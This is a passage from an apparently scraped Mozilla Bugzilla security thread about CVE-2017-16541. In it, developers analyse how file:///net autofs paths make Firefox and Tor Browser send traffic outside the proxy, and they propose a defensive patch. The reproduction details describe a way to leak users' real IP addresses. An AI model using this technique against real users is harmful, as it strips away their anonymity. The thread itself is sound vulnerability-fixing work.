          <td class="change-author"><div class="vcard vcard_4418" ><a class="email " href="/user_profile?user_id=4418" > <span class="fna">Mark Smith [:mcs]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 14:14 PDT" data-time="1509052478">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-4" data-comment-id="12793911">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c1">comment #1</a>)
<span class="quote">&gt; Ouch, I was able to reproduce. There seems to me to be three things going on
&gt; here:
&gt; 
&gt; a) Why are we loading pages that will generate security errors?</span >

For the stylesheet case at least, it seems like the security check is done after the stylesheet loader channel is created. That is probably okay for http: URLs (since creating the channel does not cause any network activity to occur in that case). But tracing through the code path underneath Loader::LoadSheet(), network activity occurs in the file:///net/...  case inside the nsFileChannel constructor. Specifically, the call to IsSymlink() hits the network, which is not too surprising since it must call stat() or lstat().

I am not familiar with all of this code, but somehow the security check needs to be done earlier.</pre></div><div class="change-set" id="c5"><div class="comment" data-id="12794269" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" ><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" ><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 16:12 PDT" data-time="1509059538">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-5" data-comment-id="12794269">That analysis sounds correct to me -- a stat is enough to trigger this. ni?Cristoph who I expect knows this code well.</pre><div class="activity"><div class="change">Flags: needinfo?(ckerschb)</div></div></div><div class="change-set" id="c6"><div class="comment" data-id="12794403" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" ><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 17:13 PDT" data-time="1509063228">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-6" data-comment-id="12794403">The &quot;can web pages load file urls?&quot; is done as part of the usual security checks (CheckMayLoad, CheckLoadURI, content policies like mixed-content blocker and CSP), and given the eventual error message these are still happening. We've found a number of things recently that send extra loads that bypass those. In particular I wonder if this is some kind of preload/prefetch/preconnect speculative load from the parser that bypasses content checks on the incorrect theory &quot;it's OK as long as we check before they end up in the document&quot;.

There are multiple prefs that turn off various preloads. Might not take too much time to diagnose whether those are involved or not.

Some of those are
  network.http.speculative-parallel-limit   (set to 0, though it should only be for http)
  network.dns.disablePrefetch               (again, file: isn't expected to need dns)

and others that appear to be turned off already, but maybe I missed one that's relevant for file: loads.</pre><div class="activity"><div class="change">URL: <a href="https://pearlcrescent.com/tor/am.html" target="_blank" rel="noreferrer"
           class="bug-url" data-safe="1"
        >https://pearlcrescent.com/tor/am.html</a></div><div class="change">Group: core-security &rarr; network-core-security</div><div class="change">Has STR: --- &rarr; yes</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-disclosure&amp;resolution=---">csectype-disclosure</a>, 
          
            <a href="/buglist.cgi?keywords=privacy&amp;resolution=---">privacy</a>, 
          
            <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a></div><div class="change">Whiteboard: [tor] &rarr; [tor][sec-high for Tor?]</div></div></div><div class="change-set" id="a30551_578488"><div class="change" id="aa30551_578488">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_578488" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/6822db445808be789b12cfae22d118dc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_578488" id="a30551_578488"><a class="email " href="/user_profile?user_id=578488" > <span class="fna">Tom Ritter [:tjr] (ni? for response to CVE/sec-approval/advisories/etc)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a30551_578488"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a30551_578488">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a30551_578488">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 20:54 PDT" data-time="1509076485">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [tor][sec-high for Tor?] &rarr; [tor][sec-critical for Tor]</div></div></div><div class="change-set" id="c7"><div class="comment" data-id="12794866" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_545036" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/d6e844df1155ca56770829937f344802?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_545036" id="a30551_578488"><a class="email " href="/user_profile?user_id=545036" > <span class="fna">Kate McKinley [:kmckinley, :Kate]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 22:56 PDT" data-time="1509083789">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-7" data-comment-id="12794866">Adding a check to CheckMayLoad, CheckLoadURI, and/or possibly CheckLoadURIWithPrincial prior to constructing the nsIChannel by calling NS_NewChannelWithTriggeringPrincipal in Loader::LoadSheet would likely solve this issue for attempting to load file: URIs as stylesheets, but would not solve it universally, if it exists elsewhere.

Another option is to bypass the stat checking when file uris are autofs uris on MacOS and Linux, so file:///net/*. This would fix the problem for all instances with a file uri at a possible risk of symlink confusion breaking SOP (see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Subverting Same-Origin Policy for Local Contents by Symbolic Link"
   href="/show_bug.cgi?id=782581">bug 782581</a>). Since that case dealt with other Android processes gaining access to sensitive content such as password and cookie databases, this may be safe to break in this one case.</pre></div><div class="change-set" id="c8"><div class="comment" data-id="12794996" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 00:04 PDT" data-time="1509087883">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-8" data-comment-id="12794996">(In reply to Kate McKinley [:kmckinley, :Kate] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c7">comment #7</a>)
<span class="quote">&gt; Adding a check to CheckMayLoad, CheckLoadURI, and/or possibly
&gt; CheckLoadURIWithPrincial prior to constructing the nsIChannel by calling
&gt; NS_NewChannelWithTriggeringPrincipal in Loader::LoadSheet would likely solve
&gt; this issue for attempting to load file: URIs as stylesheets, but would not
&gt; solve it universally, if it exists elsewhere.</span >

I think that seems a bit brittle to me. Arthur reproduced the issue with &lt;img&gt; tags as well.
 
<span class="quote">&gt; Another option is to bypass the stat checking when file uris are autofs uris
&gt; on MacOS and Linux, so file:///net/*. This would fix the problem for all
&gt; instances with a file uri at a possible risk of symlink confusion breaking
&gt; SOP (see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Subverting Same-Origin Policy for Local Contents by Symbolic Link"
   href="/show_bug.cgi?id=782581">bug 782581</a>). Since that case dealt with other Android processes
&gt; gaining access to sensitive content such as password and cookie databases,
&gt; this may be safe to break in this one case.</span >

This sounds like the more promising approach to me right now.</pre></div><div class="change-set" id="c9"><div class="comment" data-id="12795190" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 01:42 PDT" data-time="1509093756">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-9" data-comment-id="12795190">Okay, I tried to verify whether Linux is actually affected by this and, surprisingly, I failed so far. Here is what I did on a Debian testing machine and an Ubuntu 14.04:

1) Installed the autofs package
2) Uncommented the /net -hosts line in /etc/auto.master
3) Restarted the machine
4) Captured traffic with tcpdump/wireshark going to a website with the PoC.
5) No non-Tor traffic showed up.

I did this both in Tor Browser and vanilla Firefox (pointed to a local Tor) with different settings.

Does anybody have different steps that show Linux is affected, too?</pre></div><div class="change-set" id="c10"><div class="comment" data-id="12795213" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a30551_578488"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 01:55 PDT" data-time="1509094515">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-10" data-comment-id="12795213">(In reply to Mark Smith (:mcs) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c4">comment #4</a>)
<span class="quote">&gt; For the stylesheet case at least, it seems like the security check is done
&gt; after the stylesheet loader channel is created.</span >

That is the case for all of our security checks in fact. We create a channel and once we call open2() or also asyncOpen2() on the channel we perform the required security checks, because nothing should have hit the network until this point. Apparently you found a case where that's different. So your evaluation of the situation is accurate.

Since we already have the loadInfo available on the nsFileChannel we could use that information to figure out who triggered the load. I would imagine that the web never needs access to a local file and that any kind of upload scenarios (one would have to verify) are triggered by the SystemPrincipal. I hope that is the case, which would make sense. If all that is true then we could have a very hacky way of blocking. A very raw strawman patch could look like this:

--- a/netwerk/protocol/file/nsFileChannel.cpp
+++ b/netwerk/protocol/file/nsFileChannel.cpp
&#64;&#64; -278,16 +278,24 &#64;&#64; nsFileChannel::Init()
 #ifdef XP_WIN
   nsAutoString fileTarget;
 #else
   nsAutoCString fileTarget;
 #endif
   nsCOMPtr&lt;nsIFile&gt; resolvedFile;
   bool symLink;
   nsCOMPtr&lt;nsIFileURL&gt; fileURL = do_QueryInterface(mFileURI);
+
+  if (mLoadInfo-&gt;TriggeringPrincipal()-&gt;GetIsCodebasePrincipal()) {
+    // potentially we could even check for http/https if necessary
+    // I am not entirely sure if we create codebasePrincipal for something
+    // other than web these days.
+    return error;
+  }

Obviously we could also do some kind of string matching to figure out the file:///net case, but I am not sure if there are other ways to bypass that string matching.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ckerschb)</span></div></div></div><div class="change-set" id="c11"><div class="comment" data-id="12795450" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 03:09 PDT" data-time="1509098983">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-11" data-comment-id="12795450">(In reply to Christoph Kerschbaumer [:ckerschb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c10">comment #10</a>)
<span class="quote">&gt; (In reply to Mark Smith (:mcs) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c4">comment #4</a>)
&gt; &gt; For the stylesheet case at least, it seems like the security check is done
&gt; &gt; after the stylesheet loader channel is created.
&gt; 
&gt; That is the case for all of our security checks in fact. We create a channel
&gt; and once we call open2() or also asyncOpen2() on the channel we perform the
&gt; required security checks, because nothing should have hit the network until
&gt; this point. Apparently you found a case where that's different. So your
&gt; evaluation of the situation is accurate.
&gt; 
&gt; Since we already have the loadInfo available on the nsFileChannel we could
&gt; use that information to figure out who triggered the load. I would imagine
&gt; that the web never needs access to a local file and that any kind of upload
&gt; scenarios (one would have to verify) are triggered by the SystemPrincipal. I
&gt; hope that is the case, which would make sense. If all that is true then we
&gt; could have a very hacky way of blocking. A very raw strawman patch could
&gt; look like this:
&gt; 
&gt; --- a/netwerk/protocol/file/nsFileChannel.cpp
&gt; +++ b/netwerk/protocol/file/nsFileChannel.cpp
&gt; &#64;&#64; -278,16 +278,24 &#64;&#64; nsFileChannel::Init()
&gt;  #ifdef XP_WIN
&gt;    nsAutoString fileTarget;
&gt;  #else
&gt;    nsAutoCString fileTarget;
&gt;  #endif
&gt;    nsCOMPtr&lt;nsIFile&gt; resolvedFile;
&gt;    bool symLink;
&gt;    nsCOMPtr&lt;nsIFileURL&gt; fileURL = do_QueryInterface(mFileURI);
&gt; +
&gt; +  if (mLoadInfo-&gt;TriggeringPrincipal()-&gt;GetIsCodebasePrincipal()) {
&gt; +    // potentially we could even check for http/https if necessary
&gt; +    // I am not entirely sure if we create codebasePrincipal for something
&gt; +    // other than web these days.
&gt; +    return error;
&gt; +  }</span >

This looks promising. However, I am not exactly sure that we have all the necessary things ready at this point looking at ESR 52 code. It seems to me <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">bug 1319111</a> added all the changes you build upon. And backporting that one + all the dependent bugs seems unrealistic. Am I missing something (and if not what options do we have instead)?
 
<span class="quote">&gt; Obviously we could also do some kind of string matching to figure out the
&gt; file:///net case, but I am not sure if there are other ways to bypass that
&gt; string matching.</span >

True. I'd rather avoid that if possible.</pre><div class="activity"><div class="change">Flags: needinfo?(ckerschb)</div></div></div><div class="change-set" id="c12"><div class="comment" data-id="12795539" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 03:53 PDT" data-time="1509101636">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-12" data-comment-id="12795539">Adding Filippo Cavallarin, the original bug reporter, to this bug.</pre></div><div class="change-set" id="c13"><div class="comment" data-id="12795556" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_435321" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/8488539254ab196fb786c038cd86af5e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_435321" id="a30551_578488"><a class="email " href="/user_profile?user_id=435321" > <span class="fna">Nicolas Vigier</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 03:57 PDT" data-time="1509101872">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-13" data-comment-id="12795556">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c9">comment #9</a>)
<span class="quote">&gt; Okay, I tried to verify whether Linux is actually affected by this and,
&gt; surprisingly, I failed so far. Here is what I did on a Debian testing
&gt; machine and an Ubuntu 14.04:</span >

I was able to reproduce the problem on Debian Jessie.

<span class="quote">&gt; 
&gt; 1) Installed the autofs package
&gt; 2) Uncommented the /net -hosts line in /etc/auto.master
&gt; 3) Restarted the machine
&gt; 4) Captured traffic with tcpdump/wireshark going to a website with the PoC.
&gt; 5) No non-Tor traffic showed up.</span >

I did the same steps and I saw UDP traffic to the IP from the file:// path, on port 28416 (but not on port 111). However it only happens once, probably because the error is cached, so if I want to try it again I need to change the IP in the path.</pre></div><div class="change-set" id="c14"><div class="comment" data-id="12795610" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_363267" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/72977b89c86da4a19d3cf1d5920ea341?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_363267" id="a30551_578488"><a class="email " href="/user_profile?user_id=363267" > <span class="fna">Christoph Kerschbaumer [:ckerschb]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 04:31 PDT" data-time="1509103905">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-14" data-comment-id="12795610">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c11">comment #11</a>)
<span class="quote">&gt; This looks promising. However, I am not exactly sure that we have all the
&gt; necessary things ready at this point looking at ESR 52 code. It seems to me
&gt; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">bug 1319111</a> added all the changes you build upon. And backporting that one +
&gt; all the dependent bugs seems unrealistic. Am I missing something (and if not
&gt; what options do we have instead)?</span >

I am adding Honza since he fixed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">Bug 1319111</a>. Anyway, we added the triggeringPrincipal to the loadInfo within <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Add triggeringPrincipal to nsILoadInfo"
   href="/show_bug.cgi?id=1083422">Bug 1083422</a> [1], which landed for FF35. In other words triggeringPrincipal information on the loadinfo for subrequest loads should definitely be accurate for ESR52. I don't fully understand why the final channel URL is important to fix the problem in this bug. As I understand it, if mFileURI [2] would point to e.g. file:///net then we would hit the network at the time we call ::init on nsFileChannel, right? So I don't think <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Expose result principal URL (&quot;final channel URL&quot;) on LoadInfo, convert current consumers of LOAD_REPLACE"
   href="/show_bug.cgi?id=1319111">Bug 1319111</a> is relevant in any way for fixing this bug. But maybe I am missing something here.

[1] <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Add triggeringPrincipal to nsILoadInfo"
   href="/show_bug.cgi?id=1083422">https://bugzilla.mozilla.org/show_bug.cgi?id=1083422</a>
[2] <a rel="nofollow" href="https://dxr.mozilla.org/mozilla-central/source/netwerk/protocol/file/nsFileChannel.cpp#285">https://dxr.mozilla.org/mozilla-central/source/netwerk/protocol/file/nsFileChannel.cpp#285</a></pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(ckerschb)</span></div></div></div><div class="change-set" id="c15"><div class="comment" data-id="12795643" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a30551_578488"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a30551_578488"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-27 04:48 PDT" data-time="1509104933">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-15" data-comment-id="12795643">(In reply to Christoph Kerschbaumer [:ckerschb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c14">comment #14</a>)
<span class="quote">&gt; (In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c11">comment #11</a>)
